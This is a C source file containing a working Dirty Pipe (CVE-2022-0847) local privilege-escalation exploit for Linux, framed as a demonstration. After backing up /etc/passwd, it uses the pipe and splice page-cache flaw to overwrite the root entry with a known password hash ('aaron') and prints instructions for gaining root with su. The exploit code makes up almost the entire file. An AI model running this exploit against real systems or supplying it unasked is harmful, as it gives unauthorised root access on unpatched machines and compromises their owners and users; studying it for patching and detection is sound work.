/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 * Fixed version for proper demonstration
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}
}

int main(int argc, char *argv[]) {
	const char *const path = "/etc/passwd";
	const char *backup_path = "/tmp/passwd.bak";

        printf("=== Dirty Pipe CVE-2022-0847 Exploit ===\n");
        printf("Backing up /etc/passwd to %s ...\n", backup_path);
        
        FILE *f1 = fopen("/etc/passwd", "r");
        FILE *f2 = fopen(backup_path, "w");

        if (f1 == NULL) {
            printf("Failed to open /etc/passwd\n");
            exit(EXIT_FAILURE);
        } else if (f2 == NULL) {
            printf("Failed to open %s\n", backup_path);
            fclose(f1);
            exit(EXIT_FAILURE);
        }

        char c;
        while ((c = fgetc(f1)) != EOF)
            fputc(c, f2);

        fclose(f1);
        fclose(f2);
        printf("Backup created successfully!\n");

	loff_t offset = 4; // after the "root"
	const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n";
        printf("Setting root password to \"aaron\"...\n");
	const size_t data_size = strlen(data);

	if (offset % PAGE_SIZE == 0) {
		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
		return EXIT_FAILURE;
	}

	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
	const loff_t end_offset = offset + (loff_t)data_size;
	if (end_offset > next_page) {
		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
		return EXIT_FAILURE;
	}

	const int fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror("open failed");
		return EXIT_FAILURE;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return EXIT_FAILURE;
	}

	if (offset > st.st_size) {
		fprintf(stderr, "Offset is not inside the file\n");
		return EXIT_FAILURE;
	}

	if (end_offset > st.st_size) {
		fprintf(stderr, "Sorry, cannot enlarge the file\n");
		return EXIT_FAILURE;
	}

	int p[2];
	prepare_pipe(p);

	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return EXIT_FAILURE;
	}

	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("write failed");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "short write\n");
		return EXIT_FAILURE;
	}

	close(fd);
	close(p[0]);
	close(p[1]);

	printf("\n=== EXPLOIT SUCCESSFUL! ===\n");
	printf("Root password has been temporarily changed to 'aaron'\n");
	printf("Verification: Check /etc/passwd first line:\n");
	system("head -1 /etc/passwd");
	
	printf("\n=== TESTING PRIVILEGE ESCALATION ===\n");
	printf("Now you can test 'su root' with password 'aaron'\n");
	printf("After testing, run this program with 'restore' argument\n");
	
	printf("\nTo restore original /etc/passwd:\n");
	printf("./exploit_fixed_working restore\n");
	printf("OR manually: sudo cp %s /etc/passwd\n", backup_path);

	// Check if restore argument is provided
	if (argc > 1 && strcmp(argv[1], "restore") == 0) {
		printf("\nRestoring original /etc/passwd...\n");
		char restore_cmd[256];
		snprintf(restore_cmd, sizeof(restore_cmd), "sudo cp %s /etc/passwd", backup_path);
		int result = system(restore_cmd);
		if (result == 0) {
			printf("Original /etc/passwd restored successfully!\n");
		} else {
			printf("Failed to restore. Try manually: sudo cp %s /etc/passwd\n", backup_path);
		}
	}

	return EXIT_SUCCESS;
}